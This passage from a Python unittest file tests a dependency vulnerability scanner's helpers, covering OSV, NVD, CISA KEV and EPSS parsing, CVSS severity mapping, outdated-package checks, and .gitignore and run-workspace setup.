        self.assertEqual(scan.normalized_ecosystem("crates.io"), "crates-io")
        self.assertEqual(scan.normalized_ecosystem("rust"), "crates-io")

    def test_go(self):
        self.assertEqual(scan.normalized_ecosystem("golang"), "go")

    def test_passthrough(self):
        self.assertEqual(scan.normalized_ecosystem("npm"), "npm")


class NormalizedPackageNameTests(unittest.TestCase):
    def test_pypi_normalizes_dashes(self):
        self.assertEqual(
            scan.normalized_package_name("pypi", "My_Package.Name"), "my-package-name"
        )

    def test_npm_lowercases(self):
        self.assertEqual(scan.normalized_package_name("npm", "Lodash"), "lodash")

    def test_crates_io_lowercases(self):
        self.assertEqual(scan.normalized_package_name("crates-io", "Serde"), "serde")

    def test_go_passthrough(self):
        self.assertEqual(
            scan.normalized_package_name("go", "github.com/foo/bar"),
            "github.com/foo/bar",
        )


class OsvEcosystemForTests(unittest.TestCase):
    def test_mapping(self):
        self.assertEqual(scan.osv_ecosystem_for("npm"), "npm")
        self.assertEqual(scan.osv_ecosystem_for("pypi"), "PyPI")
        self.assertEqual(scan.osv_ecosystem_for("go"), "Go")
        self.assertEqual(scan.osv_ecosystem_for("crates-io"), "crates.io")

    def test_unknown_passthrough(self):
        self.assertEqual(scan.osv_ecosystem_for("custom"), "custom")


class PackageMatchesAffectedTests(unittest.TestCase):
    def test_matching_ecosystem_and_name(self):
        pkg = {"ecosystem": "npm", "name": "lodash"}
        affected = {"package": {"ecosystem": "npm", "name": "lodash"}}
        self.assertTrue(scan.package_matches_affected(pkg, affected))

    def test_mismatched_ecosystem(self):
        pkg = {"ecosystem": "npm", "name": "lodash"}
        affected = {"package": {"ecosystem": "pypi", "name": "lodash"}}
        self.assertFalse(scan.package_matches_affected(pkg, affected))

    def test_no_package_key_passes(self):
        pkg = {"ecosystem": "npm", "name": "lodash"}
        self.assertTrue(scan.package_matches_affected(pkg, {}))

    def test_name_case_insensitive(self):
        pkg = {"ecosystem": "npm", "name": "Lodash"}
        affected = {"package": {"ecosystem": "npm", "name": "lodash"}}
        self.assertTrue(scan.package_matches_affected(pkg, affected))


class UniqueNonemptyTests(unittest.TestCase):
    def test_dedup_and_filter(self):
        self.assertEqual(
            scan.unique_nonempty(["a", "b", "a", None, "", "  ", "b"]),
            ["a", "b"],
        )

    def test_none_input(self):
        self.assertEqual(scan.unique_nonempty(None), [])


class ToStringOrNoneTests(unittest.TestCase):
    def test_strips(self):
        self.assertEqual(scan.to_string_or_none("  hello  "), "hello")

    def test_empty_string(self):
        self.assertIsNone(scan.to_string_or_none(""))

    def test_whitespace_only(self):
        self.assertIsNone(scan.to_string_or_none("   "))

    def test_non_string(self):
        self.assertIsNone(scan.to_string_or_none(42))


class ToDecimalStringTests(unittest.TestCase):
    def test_integer(self):
        self.assertEqual(scan.to_decimal_string(42), "42")

    def test_float(self):
        self.assertEqual(scan.to_decimal_string(3.14), "3.14")

    def test_string_number(self):
        self.assertEqual(scan.to_decimal_string("7.5"), "7.5")

    def test_nan(self):
        self.assertIsNone(scan.to_decimal_string(float("nan")))

    def test_inf(self):
        self.assertIsNone(scan.to_decimal_string(float("inf")))

    def test_bool_excluded(self):
        self.assertIsNone(scan.to_decimal_string(True))

    def test_non_numeric_string(self):
        self.assertIsNone(scan.to_decimal_string("abc"))


class IsoDateOrNoneTests(unittest.TestCase):
    def test_date_only(self):
        self.assertEqual(
            scan.iso_date_or_none("2024-01-15"), "2024-01-15T00:00:00.000Z"
        )

    def test_already_utc(self):
        self.assertEqual(
            scan.iso_date_or_none("2024-01-15T10:30:00Z"), "2024-01-15T10:30:00Z"
        )

    def test_datetime_without_z(self):
        self.assertEqual(
            scan.iso_date_or_none("2024-01-15T10:30:00"), "2024-01-15T10:30:00Z"
        )

    def test_none(self):
        self.assertIsNone(scan.iso_date_or_none(None))

    def test_empty(self):
        self.assertIsNone(scan.iso_date_or_none(""))


class CleanVersionTests(unittest.TestCase):
    def test_strips_v_prefix(self):
        self.assertEqual(scan.clean_version("v1.2.3"), "1.2.3")

    def test_no_v_prefix(self):
        self.assertEqual(scan.clean_version("1.2.3"), "1.2.3")

    def test_none(self):
        self.assertEqual(scan.clean_version(None), "")


class NumberOrNoneTests(unittest.TestCase):
    def test_valid_number(self):
        self.assertEqual(scan.number_or_none("3.14"), 3.14)

    def test_integer(self):
        self.assertEqual(scan.number_or_none(42), 42.0)

    def test_nan(self):
        self.assertIsNone(scan.number_or_none(float("nan")))

    def test_invalid(self):
        self.assertIsNone(scan.number_or_none("abc"))


class CvssToSeverityTests(unittest.TestCase):
    def test_explicit_basescore_critical(self):
        result = scan._cvss_to_severity(
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H/E:U/RL:O/RC:C/baseScore:10.0"
        )
        self.assertEqual(result, "critical")

    def test_explicit_basescore_high(self):
        result = scan._cvss_to_severity(
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/baseScore:8.5"
        )
        self.assertEqual(result, "high")

    def test_explicit_basescore_medium(self):
        result = scan._cvss_to_severity(
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N/baseScore:5.0"
        )
        self.assertEqual(result, "medium")

    def test_explicit_basescore_low(self):
        result = scan._cvss_to_severity(
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N/baseScore:3.5"
        )
        self.assertEqual(result, "low")

    def test_computed_severity_network_av(self):
        """CVSS 3.x vector without baseScore computes from metrics."""
        result = scan._cvss_to_severity("CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H")
        self.assertIn(result, {"critical", "high"})

    def test_all_confidentiality_none(self):
        result = scan._cvss_to_severity("CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N")
        self.assertEqual(result, "low")

    def test_cvss_v4_vector_is_not_misclassified_as_low(self):
        result = scan._cvss_to_severity(
            "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"
        )
        self.assertIsNone(result)

    def test_none_input(self):
        self.assertIsNone(scan._cvss_to_severity(None))

    def test_empty_string(self):
        self.assertIsNone(scan._cvss_to_severity(""))

    def test_no_cvss_prefix(self):
        self.assertIsNone(scan._cvss_to_severity("some random string"))


class OsvQueryForPackageTests(unittest.TestCase):
    def test_with_version(self):
        pkg = {"ecosystem": "npm", "name": "lodash", "version": "4.17.21"}
        query = scan.osv_query_for_package(pkg)
        self.assertEqual(query["package"]["ecosystem"], "npm")
        self.assertEqual(query["package"]["name"], "lodash")
        self.assertEqual(query["version"], "4.17.21")

    def test_without_version(self):
        pkg = {"ecosystem": "npm", "name": "lodash"}
        query = scan.osv_query_for_package(pkg)
        self.assertNotIn("version", query)

    def test_expanded_ecosystems_use_osv_names(self):
        cases = {
            "packagist": "Packagist",
            "rubygems": "RubyGems",
            "pub": "Pub",
            "hex": "Hex",
            "nuget": "NuGet",
            "maven": "Maven",
        }
        for ecosystem, osv_ecosystem in cases.items():
            with self.subTest(ecosystem=ecosystem):
                pkg = {"ecosystem": ecosystem, "name": "demo", "version": "1.0.0"}
                query = scan.osv_query_for_package(pkg)
                self.assertEqual(query["package"]["ecosystem"], osv_ecosystem)


class CheckVulnerabilitiesTests(unittest.TestCase):
    def test_skips_versionless_packages_to_avoid_name_only_false_positives(self):
        calls = []
        original = scan.fetch_osv_querybatch

        def fake_fetch(batch):
            calls.append(batch)
            return {"results": []}

        scan.fetch_osv_querybatch = fake_fetch
        try:
            errors = []
            vulns = scan.check_vulnerabilities(
                [{"ecosystem": "npm", "name": "lodash", "version": ""}],
                errors=errors,
            )
        finally:
            scan.fetch_osv_querybatch = original

        self.assertEqual(vulns, [])
        self.assertEqual(calls, [])
        self.assertTrue(any("缺少版本" in item["message"] for item in errors))

    def test_batch_match_keeps_partial_finding_when_detail_fetch_fails(self):
        package = {"ecosystem": "npm", "name": "lodash", "version": "4.17.20"}
        with tempfile.TemporaryDirectory(prefix="butian-osv-partial-") as root:
            with (
                mock.patch.object(
                    vulnerability_sources,
                    "fetch_osv_querybatch",
                    return_value={
                        "results": [{"vulns": [{"id": "GHSA-xxxx-yyyy-zzzz"}]}]
                    },
                ),
                mock.patch.object(
                    vulnerability_sources,
                    "fetch_osv_vulnerability",
                    side_effect=TimeoutError("timeout"),
                ),
            ):
                vulns, errors = scan.check_vulnerability_batch(
                    1, [package], project_path=root
                )

        self.assertEqual(len(vulns), 1)
        self.assertEqual(vulns[0]["advisory_id"], "GHSA-xxxx-yyyy-zzzz")
        self.assertEqual(vulns[0]["package"], "lodash")
        self.assertEqual(vulns[0]["confidence"], "partial_official_match")
        self.assertEqual(vulns[0]["severity"], "unknown")
        self.assertTrue(errors)
        self.assertIn("详情查询", errors[0]["message"])


class ParseOsvQueryResultsTests(unittest.TestCase):
    def test_matches_packages_to_vulns(self):
        batch = [
            {"name": "lodash", "version": "4.17.20", "ecosystem": "npm"},
            {"name": "express", "version": "4.17.0", "ecosystem": "npm"},
        ]
        data = {
            "results": [
                {"vulns": [{"id": "GHSA-xxxx-xxxx-xxxx"}]},
                {},
            ]
        }
        matches = scan.parse_osv_query_results(data, batch)
        self.assertEqual(len(matches), 1)
        self.assertEqual(matches[0][0]["name"], "lodash")
        self.assertEqual(matches[0][1], "GHSA-xxxx-xxxx-xxxx")

    def test_empty_results(self):
        matches = scan.parse_osv_query_results({}, [])
        self.assertEqual(matches, [])

    def test_non_dict_results(self):
        matches = scan.parse_osv_query_results({"results": "bad"}, [])
        self.assertEqual(matches, [])


class ExtractOsvFixedVersionsTests(unittest.TestCase):
    def test_extracts_fixed_from_ranges(self):
        osv_record = {
            "affected": [
                {
                    "package": {"ecosystem": "npm", "name": "lodash"},
                    "ranges": [
                        {"events": [{"introduced": "0"}, {"fixed": "4.17.21"}]},
                    ],
                }
            ]
        }
        pkg = {"ecosystem": "npm", "name": "lodash"}
        fixed = scan.extract_osv_fixed_versions(osv_record, pkg)
        self.assertEqual(fixed, ["4.17.21"])

    def test_skips_commit_hash_fixed_events(self):
        osv_record = {
            "affected": [
                {
                    "package": {"ecosystem": "Hex", "name": "plug"},
                    "ranges": [
                        {
                            "events": [
                                {"introduced": "0"},
                                {"fixed": "1.15.4"},
                                {"fixed": "2cb7958d33030aa826b0c7404375844d4593d43a"},
                                {"fixed": "1.19.2"},
                                {"fixed": "aa69c5ece99c40ded88b8c6581ecc86664b0b734"},
                            ]
                        }
                    ],
                }
            ]
        }
        pkg = {"ecosystem": "hex", "name": "plug"}

        fixed = scan.extract_osv_fixed_versions(osv_record, pkg)

        self.assertEqual(fixed, ["1.15.4", "1.19.2"])

    def test_nuget_package_matching_is_case_insensitive(self):
        osv_record = {
            "affected": [
                {
                    "package": {"ecosystem": "NuGet", "name": "newtonsoft.json"},
                    "ranges": [{"events": [{"fixed": "13.0.4"}]}],
                }
            ]
        }
        pkg = {"ecosystem": "nuget", "name": "Newtonsoft.Json"}

        fixed = scan.extract_osv_fixed_versions(osv_record, pkg)

        self.assertEqual(fixed, ["13.0.4"])

    def test_no_affected(self):
        pkg = {"ecosystem": "npm", "name": "lodash"}
        self.assertEqual(scan.extract_osv_fixed_versions({}, pkg), [])

    def test_mismatched_package_skipped(self):
        osv_record = {
            "affected": [
                {
                    "package": {"ecosystem": "pypi", "name": "flask"},
                    "ranges": [
                        {"events": [{"fixed": "2.0.4"}]},
                    ],
                }
            ]
        }
        pkg = {"ecosystem": "npm", "name": "lodash"}
        self.assertEqual(scan.extract_osv_fixed_versions(osv_record, pkg), [])


class ExtractOsvCvssTests(unittest.TestCase):
    def test_extracts_score(self):
        osv_record = {
            "severity": [{"score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}]
        }
        self.assertEqual(
            scan.extract_osv_cvss(osv_record),
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        )

    def test_no_severity(self):
        self.assertIsNone(scan.extract_osv_cvss({}))


class FirstEnglishDescriptionTests(unittest.TestCase):
    def test_extracts_english(self):
        descriptions = [
            {"lang": "es", "value": "Descripción"},
            {"lang": "en", "value": "English description here"},
        ]
        self.assertEqual(
            scan.first_english_description(descriptions), "English description here"
        )

    def test_no_english(self):
        self.assertIsNone(
            scan.first_english_description([{"lang": "es", "value": "Hola"}])
        )

    def test_non_list(self):
        self.assertIsNone(scan.first_english_description("not a list"))


class ExtractCweIdsTests(unittest.TestCase):
    def test_extracts_cwes(self):
        weaknesses = [
            {"description": [{"value": "CWE-79"}, {"value": "CWE-89"}]},
            {"description": [{"value": "CWE-79"}]},  # duplicate
        ]
        self.assertEqual(scan.extract_cwe_ids(weaknesses), ["CWE-79", "CWE-89"])

    def test_non_cwe_ignored(self):
        weaknesses = [{"description": [{"value": "NVD-CWE-Other"}]}]
        self.assertEqual(scan.extract_cwe_ids(weaknesses), [])

    def test_non_list(self):
        self.assertEqual(scan.extract_cwe_ids("not a list"), [])


class ParseNvdResponseTests(unittest.TestCase):
    def _make_entry(
        self, cve_id, base_score=9.8, description="Test vuln. More detail."
    ):
        return {
            "cve": {
                "id": cve_id,
                "descriptions": [{"lang": "en", "value": description}],
                "metrics": {
                    "cvssMetricV31": [
                        {
                            "cvssData": {
                                "version": "3.1",
                                "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                                "baseScore": base_score,
                                "baseSeverity": "CRITICAL",
                            },
                            "exploitabilityScore": 3.9,
                            "impactScore": 5.9,
                        }
                    ]
                },
                "weaknesses": [{"description": [{"value": "CWE-79"}]}],
                "published": "2024-01-15T10:30:00.000Z",
                "lastModified": "2024-06-01T12:00:00.000Z",
            }
        }

    def test_parses_cve_entry(self):
        data = {"vulnerabilities": [self._make_entry("CVE-2024-0001")]}
        result = scan.parse_nvd_response(data)
        self.assertIn("CVE-2024-0001", result)
        entry = result["CVE-2024-0001"]
        self.assertEqual(entry["cveId"], "CVE-2024-0001")
        self.assertEqual(entry["title"], "Test vuln")
        self.assertEqual(entry["bestCvssScore"], "9.8")
        self.assertIn("CWE-79", entry["cweIds"])

    def test_empty_vulnerabilities(self):
        self.assertEqual(scan.parse_nvd_response({}), {})
        self.assertEqual(scan.parse_nvd_response({"vulnerabilities": []}), {})


class NormalizeCvssMetricTests(unittest.TestCase):
    def test_valid_metric(self):
        metric = {
            "cvssData": {
                "version": "3.1",
                "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                "baseScore": 9.8,
                "baseSeverity": "CRITICAL",
            },
            "exploitabilityScore": 3.9,
            "impactScore": 5.9,
        }
        result = scan.normalize_cvss_metric("cvssMetricV31", metric)
        self.assertIsNotNone(result)
        assert result is not None  # for type checkers
        self.assertEqual(result["baseScore"], "9.8")
        self.assertEqual(result["baseSeverity"], "CRITICAL")
        self.assertEqual(result["source"], "nvd")

    def test_uses_metric_level_base_severity(self):
        metric = {
            "cvssData": {
                "version": "3.1",
                "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
                "baseScore": 8.1,
            },
            "baseSeverity": "HIGH",
        }

        result = scan.normalize_cvss_metric("cvssMetricV31", metric)

        self.assertIsNotNone(result)
        assert result is not None
        self.assertEqual(result["baseSeverity"], "HIGH")

    def test_infers_base_severity_from_score_when_missing(self):
        metric = {"cvssData": {"version": "3.1", "baseScore": 7.5}}

        result = scan.normalize_cvss_metric("cvssMetricV31", metric)

        self.assertIsNotNone(result)
        assert result is not None
        self.assertEqual(result["baseSeverity"], "HIGH")

    def test_invalid_metric(self):
        self.assertIsNone(scan.normalize_cvss_metric("cvssMetricV31", {}))


class SelectBestCvssMetricTests(unittest.TestCase):
    def test_highest_score(self):
        metrics = [
            {"baseScore": "5.0"},
            {"baseScore": "9.8"},
            {"baseScore": "7.5"},
        ]
        best = scan.select_best_cvss_metric(metrics)
        self.assertIsNotNone(best)
        assert best is not None  # for type checkers
        self.assertEqual(best["baseScore"], "9.8")

    def test_empty(self):
        self.assertIsNone(scan.select_best_cvss_metric([]))


class ParseCisaKevCatalogTests(unittest.TestCase):
    def test_parses_kev_entry(self):
        data = {
            "vulnerabilities": [
                {
                    "cveID": "CVE-2024-0001",
                    "vulnerabilityName": "Test Vuln",
                    "shortDescription": "A short description",
                    "dateAdded": "2024-01-15",
                    "dueDate": "2024-07-15",
                    "knownRansomwareCampaignUse": "Known",
                    "requiredAction": "Apply updates",
                    "vendorProject": "Vendor",
                    "product": "Product",
                    "notes": "",
                    "cwes": ["CWE-79"],
                }
            ]
        }
        result = scan.parse_cisa_kev_catalog(data)
        self.assertIn("CVE-2024-0001", result)
        entry = result["CVE-2024-0001"]
        self.assertTrue(entry["kevListed"])
        self.assertEqual(entry["kevKnownRansomwareCampaignUse"], "Known")

    def test_empty(self):
        self.assertEqual(scan.parse_cisa_kev_catalog({}), {})


class ParseEpssResponseTests(unittest.TestCase):
    def test_parses_epss_data(self):
        data = {
            "data": [
                {
                    "cve": "CVE-2024-0001",
                    "epss": "0.05",
                    "percentile": "0.95",
                    "date": "2024-06-01",
                },
            ]
        }
        result = scan.parse_epss_response(data)
        self.assertIn("CVE-2024-0001", result)
        self.assertEqual(result["CVE-2024-0001"]["epss"], "0.05")

    def test_empty(self):
        self.assertEqual(scan.parse_epss_response({}), {})


class MergeCvePatchTests(unittest.TestCase):
    def test_merges_new_fields(self):
        target = {"cveId": "CVE-2024-0001", "cvssMetrics": [], "cweIds": []}
        patch = {"cveId": "CVE-2024-0001", "description": "A vuln", "baseScore": "9.8"}
        scan.merge_cve_patch(target, patch)
        self.assertEqual(target["description"], "A vuln")
        self.assertEqual(target["baseScore"], "9.8")

    def test_keeps_existing_non_empty(self):
        target = {"cveId": "CVE-2024-0001", "description": "existing"}
        patch = {"cveId": "CVE-2024-0001", "description": ""}
        scan.merge_cve_patch(target, patch)
        self.assertEqual(target["description"], "existing")

    def test_kev_listed_boolean_or(self):
        target = {"cveId": "CVE-2024-0001", "kevListed": True}
        patch = {"kevListed": False}
        scan.merge_cve_patch(target, patch)
        self.assertTrue(target["kevListed"])

    def test_cwe_ids_merged_not_duplicated(self):
        target = {"cveId": "X", "cweIds": ["CWE-79"]}
        patch = {"cweIds": ["CWE-79", "CWE-89"]}
        scan.merge_cve_patch(target, patch)
        self.assertEqual(target["cweIds"], ["CWE-79", "CWE-89"])


class BuildRiskSignalsTests(unittest.TestCase):
    def test_affected_with_fixed_version(self):
        signals = scan.build_risk_signals(["1.0.1"], [])
        self.assertIn("affected_version_match", signals)
        self.assertIn("fixed_version_available", signals)

    def test_no_fixed_version(self):
        signals = scan.build_risk_signals([], [])
        self.assertIn("no_fixed_version", signals)

    def test_cvss_critical(self):
        enrichments = [{"cvssMetrics": [{"baseScore": "9.5"}]}]
        signals = scan.build_risk_signals([], enrichments)
        self.assertIn("cvss_critical", signals)

    def test_cvss_high(self):
        enrichments = [{"cvssMetrics": [{"baseScore": "7.5"}]}]
        signals = scan.build_risk_signals([], enrichments)
        self.assertIn("cvss_high", signals)

    def test_epss_high_percentile(self):
        enrichments = [{"epssPercentile": "0.97"}]
        signals = scan.build_risk_signals([], enrichments)
        self.assertIn("epss_high_percentile", signals)

    def test_epss_elevated_percentile(self):
        enrichments = [{"epssPercentile": "0.92"}]
        signals = scan.build_risk_signals([], enrichments)
        self.assertIn("epss_elevated_percentile", signals)

    def test_cisa_kev(self):
        enrichments = [{"kevListed": True}]
        signals = scan.build_risk_signals([], enrichments)
        self.assertIn("cisa_kev", signals)

    def test_ransomware_campaign(self):
        enrichments = [{"kevKnownRansomwareCampaignUse": "Known"}]
        signals = scan.build_risk_signals([], enrichments)
        self.assertIn("ransomware_campaign", signals)


class SeverityFromEnrichmentsTests(unittest.TestCase):
    def test_from_enrichments(self):
        enrichments = [
            {"cvssMetrics": [{"baseScore": "9.8", "baseSeverity": "CRITICAL"}]}
        ]
        severity, score = scan.severity_from_enrichments({}, enrichments)
        self.assertEqual(severity, "critical")
        self.assertEqual(score, "9.8")

    def test_infers_from_cvss_score_when_enrichment_severity_missing(self):
        enrichments = [{"cvssMetrics": [{"baseScore": "7.5"}]}]

        severity, score = scan.severity_from_enrichments({}, enrichments)

        self.assertEqual(severity, "high")
        self.assertEqual(score, "7.5")

    def test_falls_back_to_osv_cvss(self):
        # C:H/I:L/A:N computes to high severity via CVSS 3.x base scoring.
        osv_record = {
            "severity": [{"score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N"}]
        }
        severity, _ = scan.severity_from_enrichments(osv_record, [])
        self.assertEqual(severity, "high")

    def test_no_data_returns_unknown(self):
        severity, _ = scan.severity_from_enrichments({}, [])
        self.assertEqual(severity, "unknown")


class IsOutdatedItemTests(unittest.TestCase):
    def test_is_outdated(self):
        item = {"current": "1.0.0", "wanted": "1.1.0"}
        self.assertTrue(scan.is_outdated_item(item))

    def test_is_current(self):
        item = {"current": "1.0.0", "wanted": "1.0.0"}
        self.assertFalse(scan.is_outdated_item(item))

    def test_no_target(self):
        item = {"current": "1.0.0", "wanted": "", "latest": ""}
        self.assertFalse(scan.is_outdated_item(item))

    def test_strips_v_prefix(self):
        item = {"current": "v1.0.0", "latest": "v2.0.0"}
        self.assertTrue(scan.is_outdated_item(item))


class OutdatedItemTests(unittest.TestCase):
    def test_builds_item(self):
        data = {"current": "1.0.0", "wanted": "1.1.0", "latest": "2.0.0"}
        item = scan.outdated_item("npm", "lodash", data)
        self.assertEqual(item["package"], "lodash")
        self.assertEqual(item["ecosystem"], "npm")
        self.assertEqual(item["current"], "1.0.0")
        self.assertEqual(item["latest"], "2.0.0")

    def test_fallback_current_from_version_index(self):
        version_index = {("npm", "lodash"): "4.17.20"}
        data = {"wanted": "4.17.21", "latest": "4.17.21"}
        item = scan.outdated_item("npm", "lodash", data, version_index=version_index)
        self.assertEqual(item["current"], "4.17.20")


class OutdatedTargetTests(unittest.TestCase):
    def test_wanted_preferred(self):
        self.assertEqual(
            scan.outdated_target({"wanted": "1.1.0", "latest": "2.0.0"}), "1.1.0"
        )

    def test_falls_back_to_latest(self):
        self.assertEqual(scan.outdated_target({"latest": "2.0.0"}), "2.0.0")

    def test_empty(self):
        self.assertEqual(scan.outdated_target({}), "")


class ChunkedTests(unittest.TestCase):
    def test_even_chunks(self):
        chunks = list(scan.chunked([1, 2, 3, 4], 2))
        self.assertEqual(chunks, [[1, 2], [3, 4]])

    def test_last_chunk_smaller(self):
        chunks = list(scan.chunked([1, 2, 3, 4, 5], 2))
        self.assertEqual(chunks, [[1, 2], [3, 4], [5]])

    def test_empty_input(self):
        self.assertEqual(list(scan.chunked([], 3)), [])

    def test_none_input(self):
        self.assertEqual(list(scan.chunked(None, 3)), [])

    def test_single_chunk(self):
        self.assertEqual(list(scan.chunked([1, 2], 10)), [[1, 2]])


class IterJsonObjectsTests(unittest.TestCase):
    def test_single_object(self):
        text = '{"a": 1}'
        result = list(scan.iter_json_objects(text))
        self.assertEqual(result, [{"a": 1}])

    def test_concatenated_objects(self):
        text = '{"a": 1}\n{"b": 2}'
        result = list(scan.iter_json_objects(text))
        self.assertEqual(result, [{"a": 1}, {"b": 2}])

    def test_whitespace_between(self):
        text = '  \n  {"a": 1}  \n\n  {"b": 2}  '
        result = list(scan.iter_json_objects(text))
        self.assertEqual(result, [{"a": 1}, {"b": 2}])

    def test_empty_string(self):
        self.assertEqual(list(scan.iter_json_objects("")), [])

    def test_non_dict_skipped(self):
        text = '[1,2,3]{"a": 1}'
        result = list(scan.iter_json_objects(text))
        self.assertEqual(result, [{"a": 1}])


class OfficialSourceErrorTests(unittest.TestCase):
    def test_format(self):
        err = scan.official_source_error("NVD", "CVE 查询", "timeout")
        self.assertEqual(err["step"], "vulnerability_check")
        self.assertIn("NVD", err["message"])
        self.assertIn("timeout", err["message"])


class RunDirFromOutputFileTests(unittest.TestCase):
    def test_assets_dir_parent(self):
        result = scan.run_dir_from_output_file(
            "/tmp/.butian/20240101-120000/assets/scan.json"
        )
        self.assertEqual(result, "/tmp/.butian/20240101-120000")

    def test_non_assets_parent(self):
        result = scan.run_dir_from_output_file("/tmp/custom/scan.json")
        self.assertEqual(result, "/tmp/custom")


class EnsureRunWorkspaceTests(unittest.TestCase):
    def test_creates_workspace_and_dirs(self):
        with tempfile.TemporaryDirectory(prefix="butian-run-") as root:
            run_dir = scan.ensure_butian_run(root)
            self.assertTrue(os.path.isdir(run_dir))
            self.assertTrue(os.path.isdir(os.path.join(run_dir, "assets")))
            self.assertFalse(os.path.exists(os.path.join(run_dir, "content")))
            with open(os.path.join(root, ".gitignore"), "r", encoding="utf-8") as f:
                content = f.read()
            lines = content.splitlines()
            self.assertIn(".butian/", lines)
            self.assertIn("docs/butian/*/security-report.md", lines)
            self.assertIn("docs/butian/*/security-report.html", lines)
            self.assertIn("docs/butian/*/security-report-final.md", lines)
            self.assertIn("docs/butian/*/security-report-final.html", lines)
            self.assertNotIn("docs/butian", lines)

    def test_collision_avoidance(self):
        with tempfile.TemporaryDirectory(prefix="butian-run-") as root:
            with mock.patch.object(
                workspace, "make_run_id", return_value="20260609-235959"
            ):
                first = scan.ensure_butian_run(root)
                scan._GITIGNORE_STATUS_BY_PROJECT.clear()
                second = scan.ensure_butian_run(root)

            self.assertEqual(os.path.basename(first), "20260609-235959")
            self.assertEqual(os.path.basename(second), "20260609-235959-2")
            self.assertTrue(os.path.isdir(os.path.join(first, "assets")))
            self.assertTrue(os.path.isdir(os.path.join(second, "assets")))

    def test_new_run_does_not_reuse_existing_directory(self):
        with tempfile.TemporaryDirectory(prefix="butian-run-") as root:
            old_run = scan.ensure_butian_run(root, run_id="20000101-0000")

            new_run = scan.ensure_butian_run(root)

            self.assertNotEqual(new_run, old_run)
            self.assertTrue(os.path.isdir(os.path.join(new_run, "assets")))
            self.assertFalse(os.path.exists(os.path.join(new_run, "content")))


class EnsureGitignoreWorkspaceTests(unittest.TestCase):
    def test_creates_gitignore(self):
        with tempfile.TemporaryDirectory(prefix="butian-gitignore-") as root:
            scan._GITIGNORE_STATUS_BY_PROJECT.clear()
            path = scan.ensure_butian_gitignore(root)
            self.assertTrue(os.path.isfile(path))
            with open(path) as f:
                content = f.read()
            lines = content.splitlines()
            self.assertIn(".butian/", lines)
            self.assertIn("docs/butian/*/security-report.md", lines)
            self.assertIn("docs/butian/*/security-report.html", lines)
            self.assertIn("docs/butian/*/security-report-final.md", lines)
            self.assertIn("docs/butian/*/security-report-final.html", lines)
            self.assertNotIn("docs/butian", lines)

    def test_appends_to_existing(self):
        with tempfile.TemporaryDirectory(prefix="butian-gitignore-") as root:
            scan._GITIGNORE_STATUS_BY_PROJECT.clear()
            with open(os.path.join(root, ".gitignore"), "w") as f:
                f.write("node_modules/\n")
            scan.ensure_butian_gitignore(root)
            with open(os.path.join(root, ".gitignore")) as f:
                content = f.read()
            lines = content.splitlines()
            self.assertIn("node_modules/", content)
            self.assertIn(".butian/", lines)
            self.assertIn("docs/butian/*/security-report.md", lines)
            self.assertIn("docs/butian/*/security-report.html", lines)
            self.assertIn("docs/butian/*/security-report-final.md", lines)
            self.assertIn("docs/butian/*/security-report-final.html", lines)
            self.assertNotIn("docs/butian", lines)

    def test_adds_report_ignore_when_butian_entry_already_exists(self):
        with tempfile.TemporaryDirectory(prefix="butian-gitignore-") as root:
            scan._GITIGNORE_STATUS_BY_PROJECT.clear()
            with open(os.path.join(root, ".gitignore"), "w") as f:
                f.write(".butian/\n")
            scan.ensure_butian_gitignore(root)
            with open(os.path.join(root, ".gitignore")) as f:
                content = f.read()
            lines = content.splitlines()
            self.assertEqual(content.count(".butian/"), 1)
            self.assertEqual(content.count("docs/butian/*/security-report.md"), 1)
            self.assertEqual(content.count("docs/butian/*/security-report.html"), 1)
            self.assertEqual(content.count("docs/butian/*/security-report-final.md"), 1)
            self.assertEqual(
                content.count("docs/butian/*/security-report-final.html"), 1
            )
            self.assertNotIn("docs/butian", lines)

    def test_does_not_duplicate_entry(self):
        with tempfile.TemporaryDirectory(prefix="butian-gitignore-") as root:
            scan._GITIGNORE_STATUS_BY_PROJECT.clear()
            scan.ensure_butian_gitignore(root)
            scan._GITIGNORE_STATUS_BY_PROJECT.clear()
            scan.ensure_butian_gitignore(root)
            with open(os.path.join(root, ".gitignore")) as f:
                content = f.read()
            lines = content.splitlines()
            self.assertEqual(content.count(".butian/"), 1)
            self.assertEqual(content.count("docs/butian/*/security-report.md"), 1)
            self.assertEqual(content.count("docs/butian/*/security-report.html"), 1)
            self.assertEqual(content.count("docs/butian/*/security-report-final.md"), 1)
            self.assertEqual(
                content.count("docs/butian/*/security-report-final.html"), 1
            )
            self.assertNotIn("docs/butian", lines)


class CheckSensitiveTrackedTests(unittest.TestCase):
    def test_git_ls_files_failure_is_reported(self):
        with tempfile.TemporaryDirectory(prefix="butian-git-sensitive-") as root:
            errors = []
            completed = subprocess.CompletedProcess(
                ["git", "ls-files"],
                128,
                stdout="",
                stderr="fatal: bad object HEAD",
            )

            with mock.patch.object(scan.subprocess, "run", return_value=completed):
                result = scan.check_sensitive_tracked(root, errors=errors)

            self.assertEqual(result, [])
            self.assertEqual(errors[0]["step"], "hygiene.git_ls_files")
            self.assertIn("无法确认被 Git 跟踪的敏感文件", errors[0]["message"])
            self.assertIn("fatal: bad object HEAD", errors[0]["message"])

    def test_non_git_directory_does_not_report_git_error(self):
        with tempfile.TemporaryDirectory(prefix="butian-not-git-") as root:
            errors = []
            completed = subprocess.CompletedProcess(
                ["git", "ls-files"],
                128,
                stdout="",
                stderr="fatal: not a git repository",
            )

